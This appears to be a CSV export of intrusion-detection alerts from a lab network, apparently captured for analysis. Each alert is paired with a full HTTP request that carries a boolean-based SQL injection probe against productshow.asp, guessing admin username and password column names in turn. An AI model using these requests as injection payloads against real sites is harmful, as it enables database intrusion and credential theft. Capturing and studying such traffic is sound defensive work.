timestamp,msg,ip_src,src_port,ip_dst,dst_port
2019/03/24 15:35:35.300298 ,ET ASP SQL Injection Attempt,192.168.244.1,56678,192.168.244.136,80
2019/03/24 15:35:35.380561,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminusername%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56679,192.168.244.136,80
2019/03/24 15:35:35.380561 ,ET ASP SQL Injection Attempt,192.168.244.1,56679,192.168.244.136,80
2019/03/24 15:35:35.439081,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_username%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56680,192.168.244.136,80
2019/03/24 15:35:35.439081 ,ET ASP SQL Injection Attempt,192.168.244.1,56680,192.168.244.136,80
2019/03/24 15:35:35.500450,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminname%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56681,192.168.244.136,80
2019/03/24 15:35:35.500450 ,ET ASP SQL Injection Attempt,192.168.244.1,56681,192.168.244.136,80
2019/03/24 15:35:35.564361,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_name%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56682,192.168.244.136,80
2019/03/24 15:35:35.564361 ,ET ASP SQL Injection Attempt,192.168.244.1,56682,192.168.244.136,80
2019/03/24 15:35:35.626572,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56683,192.168.244.136,80
2019/03/24 15:35:35.626572 ,ET ASP SQL Injection Attempt,192.168.244.1,56683,192.168.244.136,80
2019/03/24 15:35:35.689856,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminuser%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56684,192.168.244.136,80
2019/03/24 15:35:35.689856 ,ET ASP SQL Injection Attempt,192.168.244.1,56684,192.168.244.136,80
2019/03/24 15:35:35.751053,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_user%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56685,192.168.244.136,80
2019/03/24 15:35:35.751053 ,ET ASP SQL Injection Attempt,192.168.244.1,56685,192.168.244.136,80
2019/03/24 15:35:35.813717,"GET /productshow.asp?id=9%20and%20exists%20(select%20usrname%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56686,192.168.244.136,80
2019/03/24 15:35:35.813717 ,ET ASP SQL Injection Attempt,192.168.244.1,56686,192.168.244.136,80
2019/03/24 15:35:35.875887,"GET /productshow.asp?id=9%20and%20exists%20(select%20usr_name%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56687,192.168.244.136,80
2019/03/24 15:35:35.875887 ,ET ASP SQL Injection Attempt,192.168.244.1,56687,192.168.244.136,80
2019/03/24 15:35:35.939375,"GET /productshow.asp?id=9%20and%20exists%20(select%20user_name%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56688,192.168.244.136,80
2019/03/24 15:35:35.939375 ,ET ASP SQL Injection Attempt,192.168.244.1,56688,192.168.244.136,80
2019/03/24 15:35:36.001089,"GET /productshow.asp?id=9%20and%20exists%20(select%20user_admin%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56689,192.168.244.136,80
2019/03/24 15:35:36.001089 ,ET ASP SQL Injection Attempt,192.168.244.1,56689,192.168.244.136,80
2019/03/24 15:35:36.064047,"GET /productshow.asp?id=9%20and%20exists%20(select%20password%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56690,192.168.244.136,80
2019/03/24 15:35:36.064047 ,ET ASP SQL Injection Attempt,192.168.244.1,56690,192.168.244.136,80
2019/03/24 15:35:36.148137,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_password%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56691,192.168.244.136,80
2019/03/24 15:35:36.148137 ,ET ASP SQL Injection Attempt,192.168.244.1,56691,192.168.244.136,80
2019/03/24 15:35:36.203852,"GET /productshow.asp?id=9%20and%20exists%20(select%20administrator%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56692,192.168.244.136,80
2019/03/24 15:35:36.203852 ,ET ASP SQL Injection Attempt,192.168.244.1,56692,192.168.244.136,80
2019/03/24 15:35:36.266549,"GET /productshow.asp?id=9%20and%20exists%20(select%20administrators%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56693,192.168.244.136,80
2019/03/24 15:35:36.266549 ,ET ASP SQL Injection Attempt,192.168.244.1,56693,192.168.244.136,80
2019/03/24 15:35:36.327915,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminpassword%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56694,192.168.244.136,80
2019/03/24 15:35:36.327915 ,ET ASP SQL Injection Attempt,192.168.244.1,56694,192.168.244.136,80
2019/03/24 15:35:36.392901,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminpwd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56695,192.168.244.136,80
2019/03/24 15:35:36.392901 ,ET ASP SQL Injection Attempt,192.168.244.1,56695,192.168.244.136,80
2019/03/24 15:35:36.455287,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_pwd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56696,192.168.244.136,80
2019/03/24 15:35:36.455287 ,ET ASP SQL Injection Attempt,192.168.244.1,56696,192.168.244.136,80
2019/03/24 15:35:36.516853,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminpass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56697,192.168.244.136,80
2019/03/24 15:35:36.516853 ,ET ASP SQL Injection Attempt,192.168.244.1,56697,192.168.244.136,80
2019/03/24 15:35:36.578301,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_pass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56698,192.168.244.136,80
2019/03/24 15:35:36.578301 ,ET ASP SQL Injection Attempt,192.168.244.1,56698,192.168.244.136,80
2019/03/24 15:35:36.642179,"GET /productshow.asp?id=9%20and%20exists%20(select%20usrpass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56699,192.168.244.136,80
2019/03/24 15:35:36.642179 ,ET ASP SQL Injection Attempt,192.168.244.1,56699,192.168.244.136,80
2019/03/24 15:35:36.705809,"GET /productshow.asp?id=9%20and%20exists%20(select%20usr_pass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56700,192.168.244.136,80
2019/03/24 15:35:36.705809 ,ET ASP SQL Injection Attempt,192.168.244.1,56700,192.168.244.136,80
2019/03/24 15:35:36.766596,"GET /productshow.asp?id=9%20and%20exists%20(select%20user%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56701,192.168.244.136,80
2019/03/24 15:35:36.766596 ,ET ASP SQL Injection Attempt,192.168.244.1,56701,192.168.244.136,80
2019/03/24 15:35:36.830024,"GET /productshow.asp?id=9%20and%20exists%20(select%20name%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56702,192.168.244.136,80
2019/03/24 15:35:36.830024 ,ET ASP SQL Injection Attempt,192.168.244.1,56702,192.168.244.136,80
2019/03/24 15:35:36.892583,"GET /productshow.asp?id=9%20and%20exists%20(select%20pass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56703,192.168.244.136,80
2019/03/24 15:35:36.892583 ,ET ASP SQL Injection Attempt,192.168.244.1,56703,192.168.244.136,80
2019/03/24 15:35:36.955829,"GET /productshow.asp?id=9%20and%20exists%20(select%20userpass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56704,192.168.244.136,80
2019/03/24 15:35:36.955829 ,ET ASP SQL Injection Attempt,192.168.244.1,56704,192.168.244.136,80
2019/03/24 15:35:37.016526,"GET /productshow.asp?id=9%20and%20exists%20(select%20user_pass%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56705,192.168.244.136,80
2019/03/24 15:35:37.016526 ,ET ASP SQL Injection Attempt,192.168.244.1,56705,192.168.244.136,80
2019/03/24 15:35:37.077869,"GET /productshow.asp?id=9%20and%20exists%20(select%20userpassword%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56706,192.168.244.136,80
2019/03/24 15:35:37.077869 ,ET ASP SQL Injection Attempt,192.168.244.1,56706,192.168.244.136,80
2019/03/24 15:35:37.142705,"GET /productshow.asp?id=9%20and%20exists%20(select%20user_password%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56707,192.168.244.136,80
2019/03/24 15:35:37.142705 ,ET ASP SQL Injection Attempt,192.168.244.1,56707,192.168.244.136,80
2019/03/24 15:35:37.205783,"GET /productshow.asp?id=9%20and%20exists%20(select%20pwd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56708,192.168.244.136,80
2019/03/24 15:35:37.205783 ,ET ASP SQL Injection Attempt,192.168.244.1,56708,192.168.244.136,80
2019/03/24 15:35:37.266924,"GET /productshow.asp?id=9%20and%20exists%20(select%20userpwd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56709,192.168.244.136,80
2019/03/24 15:35:37.266924 ,ET ASP SQL Injection Attempt,192.168.244.1,56709,192.168.244.136,80
2019/03/24 15:35:37.328353,"GET /productshow.asp?id=9%20and%20exists%20(select%20user_pwd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56710,192.168.244.136,80
2019/03/24 15:35:37.328353 ,ET ASP SQL Injection Attempt,192.168.244.1,56710,192.168.244.136,80
2019/03/24 15:35:37.392041,"GET /productshow.asp?id=9%20and%20exists%20(select%20useradmin%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56711,192.168.244.136,80
2019/03/24 15:35:37.392041 ,ET ASP SQL Injection Attempt,192.168.244.1,56711,192.168.244.136,80
2019/03/24 15:35:37.455516,"GET /productshow.asp?id=9%20and%20exists%20(select%20pword%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56712,192.168.244.136,80
2019/03/24 15:35:37.455516 ,ET ASP SQL Injection Attempt,192.168.244.1,56712,192.168.244.136,80
2019/03/24 15:35:37.516823,"GET /productshow.asp?id=9%20and%20exists%20(select%20p_word%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56713,192.168.244.136,80
2019/03/24 15:35:37.516823 ,ET ASP SQL Injection Attempt,192.168.244.1,56713,192.168.244.136,80
2019/03/24 15:35:37.578897,"GET /productshow.asp?id=9%20and%20exists%20(select%20passwd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56714,192.168.244.136,80
2019/03/24 15:35:37.578897 ,ET ASP SQL Injection Attempt,192.168.244.1,56714,192.168.244.136,80
2019/03/24 15:35:37.643075,"GET /productshow.asp?id=9%20and%20exists%20(select%20pass_wd%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56715,192.168.244.136,80
2019/03/24 15:35:37.643075 ,ET ASP SQL Injection Attempt,192.168.244.1,56715,192.168.244.136,80
2019/03/24 15:35:37.703983,"GET /productshow.asp?id=9%20and%20exists%20(select%20yonghu%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56716,192.168.244.136,80
2019/03/24 15:35:37.703983 ,ET ASP SQL Injection Attempt,192.168.244.1,56716,192.168.244.136,80
2019/03/24 15:35:37.766506,"GET /productshow.asp?id=9%20and%20exists%20(select%20???%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56717,192.168.244.136,80
2019/03/24 15:35:37.766506 ,ET ASP SQL Injection Attempt,192.168.244.1,56717,192.168.244.136,80
2019/03/24 15:35:37.831301,"GET /productshow.asp?id=9%20and%20exists%20(select%20?????%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56718,192.168.244.136,80
2019/03/24 15:35:37.831301 ,ET ASP SQL Injection Attempt,192.168.244.1,56718,192.168.244.136,80
2019/03/24 15:35:37.892241,"GET /productshow.asp?id=9%20and%20exists%20(select%20????%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56719,192.168.244.136,80
2019/03/24 15:35:37.892241 ,ET ASP SQL Injection Attempt,192.168.244.1,56719,192.168.244.136,80
2019/03/24 15:35:37.956015,"GET /productshow.asp?id=9%20and%20exists%20(select%20???%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56720,192.168.244.136,80
2019/03/24 15:35:37.956015 ,ET ASP SQL Injection Attempt,192.168.244.1,56720,192.168.244.136,80
2019/03/24 15:35:38.017117,"GET /productshow.asp?id=9%20and%20exists%20(select%20id%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56721,192.168.244.136,80
2019/03/24 15:35:38.017117 ,ET ASP SQL Injection Attempt,192.168.244.1,56721,192.168.244.136,80
2019/03/24 15:35:38.100546,"GET /productshow.asp?id=9%20and%20exists%20(select%20uid%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56722,192.168.244.136,80
2019/03/24 15:35:38.100546 ,ET ASP SQL Injection Attempt,192.168.244.1,56722,192.168.244.136,80
2019/03/24 15:35:38.159664,"GET /productshow.asp?id=9%20and%20exists%20(select%20userid%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56723,192.168.244.136,80
2019/03/24 15:35:38.159664 ,ET ASP SQL Injection Attempt,192.168.244.1,56723,192.168.244.136,80
2019/03/24 15:35:38.219482,"GET /productshow.asp?id=9%20and%20exists%20(select%20user_id%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56724,192.168.244.136,80
2019/03/24 15:35:38.219482 ,ET ASP SQL Injection Attempt,192.168.244.1,56724,192.168.244.136,80
2019/03/24 15:35:38.282952,"GET /productshow.asp?id=9%20and%20exists%20(select%20adminid%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56725,192.168.244.136,80
2019/03/24 15:35:38.282952 ,ET ASP SQL Injection Attempt,192.168.244.1,56725,192.168.244.136,80
2019/03/24 15:35:38.345527,"GET /productshow.asp?id=9%20and%20exists%20(select%20admin_id%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56726,192.168.244.136,80
2019/03/24 15:35:38.345527 ,ET ASP SQL Injection Attempt,192.168.244.1,56726,192.168.244.136,80
